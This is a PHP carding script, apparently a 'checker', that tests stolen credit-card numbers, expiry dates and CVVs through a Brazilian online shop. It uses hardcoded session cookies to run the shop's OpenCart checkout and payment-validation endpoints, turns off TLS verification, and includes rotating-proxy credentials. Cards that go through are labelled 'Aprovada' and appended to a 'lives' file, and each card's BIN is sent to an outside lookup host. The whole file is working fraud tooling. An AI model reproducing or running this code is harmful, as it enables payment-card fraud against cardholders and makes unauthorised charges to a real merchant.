<?php
error_reporting(0);
ignore_user_abort();

function getStr($separa, $inicia, $fim, $contador){
  $nada = explode($inicia, $separa);
  $nada = explode($fim, $nada[$contador]);
  return $nada[0];
}

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

$lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){
die("Reprovada -> <span class='text-danger'>Informações inválidas!</span> | Dev: <span class='text-warning'>@wslzimm7</span><br>");
}

$lista = $lista[0];
$cc = explode("|", $lista)[0];
$mes = explode("|", $lista)[1];
$ano = explode("|", $lista)[2];
$cvv = explode("|", $lista)[3];

if (strlen($mes) == 1){
  $mes = "0$mes";
}

if (strlen($ano) == 2){
  $ano = "20$ano";
}

$proxy = 'p.webshare.io:80';
$proxy_auth = 'qybruboo-rotate:xjgtpuf4rh6g';

$cookies = 'OCSESSION=62b1a22f8fed582f20887b20ca53b9d2; language=pt-br; currency=BRL; _gcl_au=1.1.673209233.1743462096; _ga=GA1.1.1157369038.1743462097; _fbp=fb.2.1743462097762.75669097596890083; __trf.src=encoded_eyJmaXJzdF9zZXNzaW9uIjp7InZhbHVlIjoiKG5vbmUpIiwiZXh0cmFfcGFyYW1zIjp7fX0sImN1cnJlbnRfc2Vzc2lvbiI6eyJ2YWx1ZSI6Iihub25lKSIsImV4dHJhX3BhcmFtcyI6e319LCJjcmVhdGVkX2F0IjoxNzQzNDYyMjM2NDAzfQ==; _ga_9ZWKQ8SD98=GS1.1.1743462097.1.1.1743462236.51.0.0';

function addProduto(){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.ordenhashop.com.br/index.php?route=checkout/cart/add");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: '.$cookies.'',
'origin: https://www.ordenhashop.com.br',
'referer: https://www.ordenhashop.com.br/pecas-para-ordenhadeira/abracadeiras-e-suporte'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//curl_setopt($ch, CURLOPT_PROXY, $proxy);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_auth);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'quantity=1&product_id=1278');
$confirm = curl_exec($ch);
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.ordenhashop.com.br/index.php?route=checkout/shipping_method/save");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: '.$cookies.'',
'origin: https://www.ordenhashop.com.br',
'referer: https://www.ordenhashop.com.br/index.php?route=checkout/checkout'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//curl_setopt($ch, CURLOPT_PROXY, $proxy);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_auth);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'shipping_method=frenet.03220&comment=');
$setpay = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.ordenhashop.com.br/index.php?route=checkout/payment_method/save");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: '.$cookies.'',
'origin: https://www.ordenhashop.com.br',
'referer: https://www.ordenhashop.com.br/index.php?route=checkout/checkout'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//curl_setopt($ch, CURLOPT_PROXY, $proxy);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_auth);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method=rede&comment=&agree=1');
$setpay = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.ordenhashop.com.br/index.php?route=extension/payment/rede/validate");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: '.$cookies.'',
'origin: https://www.ordenhashop.com.br',
'referer: https://www.ordenhashop.com.br/index.php?route=checkout/checkout'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//curl_setopt($ch, CURLOPT_PROXY, $proxy);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_auth);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card_number='.$cc.'&holder_name=gabriela+silvas&card_expiration_year='.$ano.'&card_expiration_month='.$mes.'&card_cvv='.$cvv.'&card_installments=1');
$pagar = curl_exec($ch);
if(strpos($pagar, 'success')){
file_put_contents("lives-api-nova.txt", "$lista"."\n\r" ,FILE_APPEND);
$bin = json_decode(file_get_contents("https://storebot.store/binsearch.php?bin=".substr($cc , 0,6)), true);
$infobin = mb_strtoupper("{$bin['bandeira']} {$bin['tipo']} {$bin['nivel']} {$bin['banco']} {$bin['pais']}");
addProduto();
die("Aprovada -> <span class='text-success'>$lista $infobin</span> Retorno: <span class='text-primary'>(00) - Transação autorizada com sucesso. --- Debitou: R$11,57</span> Dev: <span class='text-warning'>@wslzimm7</span><br>");
}
elseif(strpos($pagar, 'N\u00e3o foi poss\u00edvel concluir seu pedido. Por favor, ente novamente em alguns instantes.')) {
$bin = json_decode(file_get_contents("https://storebot.store/binsearch.php?bin=".substr($cc , 0,6)), true);
$infobin = mb_strtoupper("{$bin['bandeira']} {$bin['tipo']} {$bin['nivel']} {$bin['banco']} {$bin['pais']}");
die("Reprovada -> <span class='text-success'>$lista $infobin</span> Retorno: <span class='text-primary'>Transação não autorizada. - Autorizacao negada.</span> Dev: <span class='text-warning'>@wslzimm7</span><br>");
}
else{
$bin = json_decode(file_get_contents("https://storebot.store/binsearch.php?bin=".substr($cc , 0,6)), true);
$infobin = mb_strtoupper("{$bin['bandeira']} {$bin['tipo']} {$bin['nivel']} {$bin['banco']} {$bin['pais']}");
die("Reprovada -> <span class='text-success'>$lista $infobin</span> Retorno: <span class='text-primary'>( Erro desconhecido! )</span> Dev: <span class='text-warning'>@wslzimm7</span><br>");
}
?>